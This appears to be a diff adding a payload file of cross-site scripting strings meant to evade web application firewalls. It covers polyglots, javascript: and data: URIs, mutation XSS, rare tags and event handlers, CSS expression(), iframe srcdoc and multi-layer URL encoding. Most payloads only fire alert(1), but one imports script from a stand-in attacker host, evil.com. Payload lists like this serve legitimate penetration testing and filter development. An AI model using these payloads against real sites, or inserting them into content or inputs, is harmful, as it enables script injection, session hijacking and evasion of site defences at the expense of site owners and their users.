@@ -1,0 +1,166 @@
+# WAF Bypass Payloads
+# Payloads specifically designed to bypass Web Application Firewalls
+# These exploit WAF parsing inconsistencies and edge cases
+
+# Polyglot payloads
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# Protocol confusion
+javascript:alert(1)
+javascript://comment%0aalert(1)
+javascript://%0aalert(1)
+javascript&#58;alert(1)
+javascript&#x3a;alert(1)
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
+
+# Data URI schemes
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html,<img src=x onerror=alert(1)>
+data:,<script>alert(1)</script>
+
+# Mutation XSS (mXSS)
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noembed><p title="</noembed><img src=x onerror=alert(1)>">
+<style><img src=x onerror=alert(1)></style>
+
+# Tag mutation sequences
+<listing><script>alert(1)</script></listing>
+<xmp><script>alert(1)</script></xmp>
+<plaintext><script>alert(1)</script>
+
+# Rare/obsolete HTML tags
+<marquee onstart=alert(1)>XSS</marquee>
+<bgsound src=javascript:alert(1)>
+<blink onerror=alert(1)>X</blink>
+<isindex type=image src=1 onerror=alert(1)>
+
+# XML namespace abuse
+<html xmlns:xss><xss:script>alert(1)</xss:script></html>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
+
+# Import statements
+<script>import('data:text/javascript,alert(1)')</script>
+<script>import('//evil.com/xss.js')</script>
+
+# Using less common event handlers
+<body onbeforeprint=alert(1)>
+<body onafterprint=alert(1)>
+<body onbeforeunload=alert(1)>
+<body onhashchange=alert(1)>
+<body onoffline=alert(1)>
+<body ononline=alert(1)>
+<body onpagehide=alert(1)>
+<body onpageshow=alert(1)>
+<body onpopstate=alert(1)>
+<body onstorage=alert(1)>
+<body onunload=alert(1)>
+
+# Meta tag abuse
+<meta http-equiv="refresh" content="0; url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;javascript:alert(1)">
+
+# Link tag variations
+<link rel="import" href="data:text/html,<script>alert(1)</script>">
+<link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7D>
+
+# CSS-based XSS
+<style>@import'javascript:alert(1)';</style>
+<style>body{background:url('javascript:alert(1)')}</style>
+<style>*{x:expression(alert(1))}</style>
+
+# Using base tag
+<base href="javascript:alert(1)//">
+<base href="javascript://%0aalert(1)">
+
+# Template tag abuse
+<template><script>alert(1)</script></template>
+
+# Object and embed variations
+<object data="javascript:alert(1)">
+<object data="data:text/html,<script>alert(1)</script>">
+<embed src="javascript:alert(1)">
+<embed src="data:text/html,<script>alert(1)</script>">
+
+# SVG with CDATA
+<svg><script><![CDATA[alert(1)]]></script></svg>
+
+# Animation-based XSS
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x to=1>
+
+# Foreign object in SVG
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+
+# Math ML injection
+<math><mtext><script>alert(1)</script></mtext></math>
+<math><mi xlink:href="data:x,<script>alert(1)</script>">
+
+# Using expression() in CSS (IE)
+<div style="x:expression(alert(1))">
+<div style="background:url('javascript:alert(1)')">
+
+# Form action exploits
+<form action="javascript:alert(1)"><input type=submit>
+<button formaction=javascript:alert(1)>CLICK
+
+# Attribute injection via spaces
+<img src=x	onerror=alert(1)>
+<img src=x
+onerror=alert(1)>
+
+# Using contenteditable
+<div contenteditable onblur=alert(1)>lose focus</div>
+<div contenteditable oninput=alert(1)>type here</div>
+
+# Draggable attribute abuse
+<div draggable="true" ondragstart="alert(1)">drag</div>
+
+# Spellcheck abuse
+<div spellcheck="true" onfocus="alert(1)" contenteditable>X</div>
+
+# Translate abuse
+<div translate="yes" onblur="alert(1)" contenteditable>X</div>
+
+# Using srcdoc in iframe
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe srcdoc="<img src=x onerror=alert(1)>">
+
+# Sandbox escape attempts
+<iframe sandbox="allow-scripts" src="data:,<script>alert(1)</script>">
+
+# Using form-associated elements
+<input form=x><form id=x action=javascript:alert(1)><input type=submit>
+
+# Multiple encoding layers
+%253Cscript%253Ealert(1)%253C/script%253E
+%2525253Cscript%2525253Ealert(1)%2525253C/script%2525253E
+
+# Combining multiple WAF bypass techniques
+<svg/onload=alert(1)//
+<svg	onload=alert(1)>
+<svg
+onload=alert(1)>
+
+# Using ES6 features
+<script>alert`1`</script>
+<script>`${alert(1)}`</script>
+
+# Leveraging browser quirks
+<script><!--</script><script>alert(1)//--></script>
+<script><!--*/alert(1)//--></script>
+
+# Using unknown/custom tags
+<xxx onload=alert(1)>
+<custom onerror=alert(1)>
+
+# Breaking with newlines
+<img src=x
+onerror=alert(1)>
+<svg
+onload=
+alert(1)>
+
+# Breaking with carriage returns
+<img src=xonerror=alert(1)>
